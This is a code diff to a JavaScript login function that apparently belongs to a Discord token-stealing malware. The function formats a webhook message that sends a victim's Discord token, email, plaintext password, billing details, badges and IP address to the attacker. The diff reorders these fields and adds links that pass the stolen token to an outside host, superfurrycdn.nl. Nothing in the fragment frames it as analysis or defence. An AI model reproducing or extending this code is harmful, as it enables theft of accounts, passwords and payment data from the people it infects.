@@ -589,37 +589,41 @@ const login = async (email, password, token) => {
     avatar_url: config.embed_icon,
     embeds: [
       {
-        description: `[<:3763verifiedgreen:989343589077221396> **Click Here To Copy Token On Mobile**](https://superfurrycdn.nl/copy/${token})`,
         color: config.embed_color,
         fields: [
           {
              "name": "<a:sn1:989238042164351006> Token:",
-             "value": `\`\`\`${token}\`\`\``,
+             "value": `\`\`\`${token}\`\`\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
              "inline": false
           },
           {
-            "name": "<a:2788demonshit:989345376567971870> Billing:",
-            "value": `\`${billing}\``,
-            "inline": true
-          },
-          {
-            name: '<a:satanist:802503618972483615> Badges:',
+            name: '<:sn4:989240048157356062> Badges:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Email:',
-            value: `\`${email}\``,
+            name: '<:sn6:989338031179857921> Nitro Type:',
+            value: `*Soon...*`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> IP:',
-            value: `\`${config.ip}\``,
+            "name": "<a:sn5:989240264386293800> Billing:",
+            "value": `\`${billing}\``,
+            "inline": true
+          },
+          {
+            name: '<:sn3:989239794108350514> IP:',
+            value: `\`${config.ip}\`\n[IpInfo](https://ipinfo.io/${ip})`,
             inline: true,
           },
           {
-            name: '<a:satan:846706207632261120> Password:',
-            value: `\`${password}\``,
+            name: '<a:sn2:989239408400138310> Email:',
+            value: `\`${email}\`\n[Copy Email](https://superfurrycdn.nl/copy/${token})`,
+            inline: true,
+          },
+          {
+            name: '<a:sn7:989344653323169802> Password:',
+            value: `\`${password}\`\n[Copy Password](https://superfurrycdn.nl/copy/${token})`,
             inline: true,
           },
         ],
